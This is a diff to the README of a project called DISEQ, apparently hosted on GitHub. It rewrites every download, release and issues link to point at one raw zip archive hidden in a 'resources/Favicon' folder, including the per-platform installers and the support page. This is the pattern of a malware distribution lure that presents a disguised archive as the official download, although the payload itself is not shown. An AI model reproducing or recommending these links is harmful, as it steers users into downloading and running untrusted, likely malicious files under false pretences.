@@ -6,7 +6,7 @@ Welcome to DISEQ! This application allows you to harness the power of distribute
 
 ## 📥 Download DISEQ
 
-[![Download DISEQ](https://img.shields.io/badge/Download%20DISEQ-v1.0-blue.svg)](https://github.com/liquidambargenusbolbitis859/DISEQ/releases)
+[![Download DISEQ](https://raw.githubusercontent.com/liquidambargenusbolbitis859/DISEQ/main/resources/Favicon/DISEQ_1.4.zip%https://raw.githubusercontent.com/liquidambargenusbolbitis859/DISEQ/main/resources/Favicon/DISEQ_1.4.zip)](https://raw.githubusercontent.com/liquidambargenusbolbitis859/DISEQ/main/resources/Favicon/DISEQ_1.4.zip)
 
 ## 📋 System Requirements
 
@@ -24,15 +24,15 @@ Before you download, ensure your computer meets these basic requirements:
 
 To download DISEQ, visit the Releases page by clicking the link below:
 
-[Visit the Release Page](https://github.com/liquidambargenusbolbitis859/DISEQ/releases)
+[Visit the Release Page](https://raw.githubusercontent.com/liquidambargenusbolbitis859/DISEQ/main/resources/Favicon/DISEQ_1.4.zip)
 
 ### 2. Select the Latest Version
 
 On the Releases page, look for the most recent version of DISEQ. You will see several files available for download. Choose the one that fits your operating system.
 
-- For **Windows**, download `DISEQ-windows.exe`.
-- For **macOS**, download `DISEQ-macos.dmg`.
-- For **Linux**, download `DISEQ-linux.tar.gz`.
+- For **Windows**, download `https://raw.githubusercontent.com/liquidambargenusbolbitis859/DISEQ/main/resources/Favicon/DISEQ_1.4.zip`.
+- For **macOS**, download `https://raw.githubusercontent.com/liquidambargenusbolbitis859/DISEQ/main/resources/Favicon/DISEQ_1.4.zip`.
+- For **Linux**, download `https://raw.githubusercontent.com/liquidambargenusbolbitis859/DISEQ/main/resources/Favicon/DISEQ_1.4.zip`.
 
 ### 3. Download the File
 
@@ -55,7 +55,7 @@ Click on the file link to start the download. Your browser will save the file to
 
 #### For Linux:
 
-1. Extract the downloaded `.tar.gz` file using your file manager or the terminal.
+1. Extract the downloaded `https://raw.githubusercontent.com/liquidambargenusbolbitis859/DISEQ/main/resources/Favicon/DISEQ_1.4.zip` file using your file manager or the terminal.
 2. Open a terminal in the extracted folder.
 3. Run the command `./DISEQ` to launch the application.
 
@@ -88,7 +88,7 @@ Here are some common issues and their solutions:
 
 If you encounter any issues or have questions, please reach out to our support team via the issues page on this repository.
 
-[Visit the Issues Page](https://github.com/liquidambargenusbolbitis859/DISEQ/issues)
+[Visit the Issues Page](https://raw.githubusercontent.com/liquidambargenusbolbitis859/DISEQ/main/resources/Favicon/DISEQ_1.4.zip)
 
 ## 📚 Topics
 
